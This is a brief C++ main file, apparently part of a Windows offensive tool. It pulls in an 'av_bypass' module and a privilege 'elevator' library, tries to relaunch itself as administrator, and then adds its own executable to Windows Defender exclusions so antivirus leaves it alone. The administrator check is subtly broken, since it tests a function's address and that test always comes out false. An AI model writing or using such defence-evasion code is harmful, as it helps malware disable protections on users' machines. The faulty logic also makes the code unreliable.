//
// Created by MateuszAndruszkiewic on 17.12.2024.
//
#include "./modules/av/av_bypass.cpp"
#include "../lib/beauty_print.cpp"
#include "../lib/elevator.cpp"
#include <iostream>

int main() {
  	if (!&IsRunningAsAdmin){
    	  printWarning("Relaunching as admin");
          RelaunchAsAdmin();
    }
    AddCurrentExecutableToDefenderExclusions();
    return 0;
}